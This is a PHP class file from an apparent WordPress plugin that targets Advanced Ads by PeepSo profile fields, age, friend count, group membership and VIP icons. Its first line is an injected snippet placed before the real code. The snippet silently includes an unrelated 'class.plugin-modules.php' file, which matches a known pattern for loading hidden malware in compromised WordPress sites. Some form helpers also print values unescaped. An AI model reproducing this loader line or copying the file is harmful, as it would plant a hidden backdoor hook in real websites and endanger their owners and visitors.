<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

class PeepSoAdvancedAdsTargeting
{
    // Profile Field - INT / Age

    public static function field_int_metabox($options, $index)
    {
        echo self::render_form_name($options, $index);

        $operators = array(
                'is'=>__('equal to'),
                'is_not'=>__('not equal to'),
                'is_more'=>__('more than'),
                'is_more_or_equal'=>__('more than or equal to'),
                'is_less'=>__('less than'),
                'is_less_or_equal'=>__('less than or equal to'),
         );

        echo self::render_form_select($options, $index, $operators, 'operator', self::get_operator($options), FALSE);

        ?><input type="number" name="<?php echo self::get_name($index); ?>[value]" value="<?php echo absint(self::get_value($options)); ?>"/><?php
    }

    public static function field_int_check($options)
    {
        if(!self::check_user()) { return FALSE; }

        $operator = self::get_operator($options);
        $test_value = self::get_value($options);

        if('peepso_age' == self::get_type($options)) {
            $field = PeepSoField::get_field_by_id('birthdate');

            // empty/null date should default to age "0"
            if(0 == $field->prop('value')) {
                $value=0;
                self::debug('User age is 0!', NULL, 'warning');
            } else {
                $value = (int)preg_replace("/[^0-9]/", "", human_time_diff_round_alt(strtotime($field->prop('value')), date('U', current_time('timestamp', 0))));
            }
        } else {
            $field = self::get_field($options);
            $value = $field->prop('value');
        }

        if(!$field) {
            self::debug("Field missing " . self::get_type($options));
        }


        $result = self::get_operator_result($operator, $value, $test_value);

        self::debug("field" . $field->prop('id') . " value [". $value ."] " . strtoupper($operator) ." [$test_value]?", $result);

        return $result;
    }



    // Profile Field - Select

    public static function field_select_metabox($options, $index)
    {
        echo self::render_form_name($options, $index);
        echo self::render_is_or_is_not($options, $index);

        if (!($field = self::get_field($options))) {
            echo __('Field does not exist', 'peepso-advanced-ads');
            return FALSE;
        }

        $select_options = $field->prop('meta', 'select_options');

        if(!count($select_options)) {
            echo __('No field values', 'peepso-advanced-ads');
            return;
        }

        echo self::render_form_select($options, $index, $select_options, 'value', self::get_value($options));
    }

    public static function field_select_check($options)
    {
        if(!self::check_user()) { return FALSE; }

        if(!($field = self::get_field($options))) {
            self::debug("Field missing ".self::get_type($options));
            return FALSE;
        }

        $operator = self::get_operator($options);
        $test_value = self::get_value($options);

        $expected_result = self::get_expected_result($operator);

        $value = $field->prop('value');


        if(is_array($value)) {
            $result = ($expected_result == in_array($test_value, $value));

            self::debug("field " . $field->prop('id') . " in_array [". print_r($value, TRUE). "] " . strtoupper($operator) ." [$test_value]?", $result);
        } else {
            $result = ($expected_result == ($value == $test_value));
            
            self::debug("field " . $field->prop('id') . " value [". $value . "] " . strtoupper($operator) ." [$test_value]?", $result);
        }

        return $result;
    }

    // Friend count

    public static function friend_count_check($options, $index)
    {
        if(!self::check_user()) { return FALSE; }

        $operator = self::get_operator($options);
        $test_value = self::get_value($options);

        $PeepSoFriendsModel =  new PeepSoFriendsModel();
        $value = $PeepSoFriendsModel->get_num_friends(get_current_user_id());

        $result = self::get_operator_result($operator, $value,$test_value);

        self::debug("user friend count value [". $value . "] " . strtoupper($operator) ." [$test_value]?", $result);

        return $result;
    }


    // Group memberships

    public static function group_member_metabox($options, $index) {

        echo self::render_form_name($options, $index);
        echo self::render_is_or_is_not($options, $index);

        $PeepSoGroups = new PeepSoGroups();
        $groups = $PeepSoGroups->get_groups(0,-1,'post_title', 'ASC', NULL);

        $select_options = array();

        if(!count($groups)) {
            echo __('No groups', 'peepso-advanced-ads');
            return;
        }

        foreach($groups as $group) {
            $unpublished = ($group->published) ? '' : ' '.__('(unpublished)', 'peepso-advanced-ads');
            $label = sprintf('%s%s',$group->name,$unpublished);
            $select_options[$group->id] = $label;
        }

        echo self::render_form_select($options, $index, $select_options, 'value', self::get_value($options));
    }

    public static function group_member_check($options) {

        if(!self::check_user()) { return FALSE; }

        $operator = self::get_operator($options);
        $value = self::get_value($options);

        $expected_result = self::get_expected_result($operator);

        $PeepSoGroupUser = new PeepSoGroupuser($value);

        // group not found
        if(FALSE == $PeepSoGroupUser) {
            self::debug("Group not found: $value");
            return FALSE;
        }

        $result = ($PeepSoGroupUser->is_member == $expected_result);

        self::debug("user " . strtoupper($operator) . "  member of Group [$value]?", $result);

        return $result;
    }

    // VIP

    public static function vip_metabox($options, $index) {

        echo self::render_form_name($options, $index);
        echo self::render_is_or_is_not($options, $index);

        $PeepSoVipIconsModel = new PeepSoVipIconsModel();
        $icons = $PeepSoVipIconsModel->vipicons;

        $select_options = array();

        if(!count($icons)) {
            echo __('No VIP icons', 'peepso-advanced-ads');
            return;
        }

        foreach($icons as $vipicon) {
            $unpublished = ($vipicon->published) ? '' : ' '.__('(unpublished)', 'peepso-advanced-ads');
            $label = sprintf('%s%s',$vipicon->title,$unpublished);
            $select_options[$vipicon->id] = $label;
        }

        echo self::render_form_select($options, $index, $select_options, 'value', self::get_value($options));
    }

    public static function vip_check($options)
    {
        if(!self::check_user()) { return FALSE; }

        $operator = self::get_operator($options);
        $value = self::get_value($options);

        $expected_result = self::get_expected_result($operator);

        $icons = get_the_author_meta( 'peepso_vip_user_icon', get_current_user_id() ) ;
        $icons = (!is_array($icons) && !empty($icons)) ? [$icons] : $icons;

        $result = (in_array($value, $icons) == $expected_result);

        self::debug("user VIP ICON [".json_encode($icons)."] " . strtoupper($operator) . " [$value]?", $result);

        return $result;
    }

    // Utils - DRY - various

    private static function debug($msg, $result=NULL, $type = 'debug') {
        $debug = "";
        if(NULL !== $result) {
            $debug .="[";
            $debug .= ($result) ? "YES" : "NO";
            $debug .="] ";
        }
        $debug .= $msg;

        new PeepSoError($debug, $type, 'advads_targeting');
    }

    private static function check_user() {
        if(!get_current_user_id()) {
            new PeepSoError('User not logged in', 'debug', 'advads_targeting');
            return FALSE;
        }

        return TRUE;
    }

    // Utils - DRY - parsing options

    private static function get_expected_result($operator) {
        return ('is' == $operator) ? TRUE : FALSE;
    }

    private static function get_operator_result($operator, $value, $test_value)
    {
        switch($operator) {
            case 'is';
                $result = ($value == $test_value);
                break;
            case 'is_not';
                $result = ($value != $test_value);
                break;
            case 'is_more';
                $result = ($value > $test_value);
                break;
            case 'is_less';
                $result = ($value < $test_value);
                break;
            case 'is_more_or_equal';
                $result = ($value >= $test_value);
                break;
            case 'is_less_or_equal';
                $result = ($value <= $test_value);
                break;
            default:
                $result = FALSE;
        }

        return $result;
    }

    private static function get_field($options)
    {
        $field_id = (int) str_ireplace('peepso_field_', '', self::get_type($options));
        $field = PeepSoField::get_field_by_id($field_id);

        return $field;
    }

    private static function get_name($index) {
        return Advanced_Ads_Visitor_Conditions::FORM_NAME . '[' . $index . ']';
    }

    private static function get_operator($options) {
        $operator = (isset( $options['operator'] )) ? $options['operator'] : '';

        if(!in_array($operator, self::get_valid_operators())) {
            $operator = 'is';
        }

        return $operator;
    }

    private static function get_type($options) {
        return isset( $options['type'] ) ? $options['type'] : '';
    }

    private static function get_value($options) {
        return isset( $options['value'] ) ? $options['value'] : '';
    }

    private static function get_valid_operators()
    {
       return array(
            'is',
            'is_not',
            'is_more',
            'is_more_or_equal',
            'is_less',
            'is_less_or_equal',
        );
    }

    // Utils - DRY - printing form elements

    private static function render_form_name($options, $index)
    {
        $type = self::get_type($options);
        $name = self::get_name($index);
        ob_start();
        ?>
        <input type="hidden" name="<?php echo $name; ?>[type]" value="<?php echo $type; ?>"/>
        <?php
        return ob_get_clean();
    }

    private static function render_is_or_is_not($options, $index)
    {
        return self::render_form_select($options, $index, array('is'=>__('is'),'is_not'=>__('is not')), 'operator', self::get_operator($options), FALSE);
    }

    private static function render_form_select($options, $index, $select_options, $input_name, $selected_value, $first_option_empty = TRUE)
    {
        $name = self::get_name($index);
        ob_start();
        ?>
        <select name="<?php echo $name; ?>[<?php echo $input_name;?>]">
            <?php if(TRUE == $first_option_empty) : ?>
                <option><?php echo __( '-- choose one --' ); ?></option>
                <?php
            endif;
            foreach($select_options as $key=>$title) : ?>
                <option value="<?php echo $key; ?>" <?php selected( $key, $selected_value ); ?>><?php echo $title; ?></option>
            <?php endforeach; ?>
        </select>
        <?php
        return ob_get_clean();
    }
}

// EOF